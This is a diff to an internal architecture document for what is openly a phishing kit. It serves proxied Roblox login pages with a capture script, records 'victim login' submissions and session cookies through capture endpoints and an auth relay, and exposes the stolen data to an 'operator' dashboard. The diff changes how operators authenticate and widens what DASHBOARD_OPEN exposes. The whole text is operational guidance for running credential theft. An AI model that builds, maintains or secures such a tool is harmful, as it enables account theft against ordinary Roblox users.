@@ -19,12 +19,10 @@ Read this before touching anything. Line anchors drift — re-grep before editin
 
 ```
 static files ────────────────► express.static(public/)
-?key=<OPERATOR_KEY> ─────────► sets signed `op` cookie, redirects (server.js, early middleware)
 session (file store) ────────► JsonSessionStore, debounced writes
-/api/op/unlock ──────────────► public, rate-limited, sets `op` cookie
 /api/* ──────────────────────► apiGuard (security.js)
    public prefixes: victim login + catalog reads, capture beacon (signed nonce), client-error
-   everything else: session OR operator cookie OR genuine loopback (no proxy headers)
+   everything else: session OR genuine loopback (no proxy headers) OR DASHBOARD_OPEN
 /login ──────────────────────► loginPage (lib/pages/login.js) — proxied Roblox HTML + capture script (signed nonce)
 /capture, /capture.php ──────► phpCaptureHandler → captureLoginHandler
 /proxy/roblox/* ─────────────► allowlisted relay; auth POSTs are observed, cookies captured
@@ -53,13 +51,12 @@ session (file store) ────────► JsonSessionStore, debounced wri
 
 ## 4. Auth model
 
-Three ways in, checked in order by `isOperatorAuthorized`:
+Two ways in, checked in order by `isOperatorAuthorized`:
 
 1. Discord OAuth session (`req.session.user`, id must not be `public`).
-2. Signed `op` cookie — set by `/?key=<OPERATOR_KEY>` or `POST /api/op/unlock`. Value is `HMAC(SESSION_SECRET, "operator:"+key)`, httpOnly, 12h.
-3. Genuine loopback — request must arrive with **no** proxy headers (`x-forwarded-for`, `x-real-ip`, `forwarded`, …) and both `req.ip` and the socket peer must be loopback.
+2. Genuine loopback — request must arrive with **no** proxy headers (`x-forwarded-for`, `x-real-ip`, `forwarded`, …) and both `req.ip` and the socket peer must be loopback.
 
-`DASHBOARD_OPEN=true` opens the panel *page* only. It does not open capture data.
+`DASHBOARD_OPEN=true` is the single-operator switch: it opens `/dashboard` and the capture APIs to anyone who can reach the host. Use it only on a box nobody else has, or put the host behind your own auth.
 
 `app.set('trust proxy', 'loopback')` — the old `true` trusted any client-supplied `X-Forwarded-For` and made the operator gate a header.
 
@@ -98,9 +95,8 @@ Vercel: `BLOB_READ_WRITE_TOKEN` or `KV_REST_API_*` switches `lib/store.js` to a 
 
 | var | use |
 |---|---|
-| `SESSION_SECRET` | required; sessions + nonce/operator HMAC |
-| `OPERATOR_KEY` | remote operator access; `/?key=…` or unlock form |
-| `DASHBOARD_OPEN` | page-only escape hatch (data stays gated) |
+| `SESSION_SECRET` | required; sessions |
+| `DASHBOARD_OPEN` | single-operator switch: panel and capture APIs open |
 | `COOKIE_SECURE` | `false` disables secure cookies for local http |
 | `TRUST_PROXY` | `true` trusts the whole chain; default is `loopback` |
 | `ALLOWED_ORIGINS` | CORS allowlist for the auth proxy |
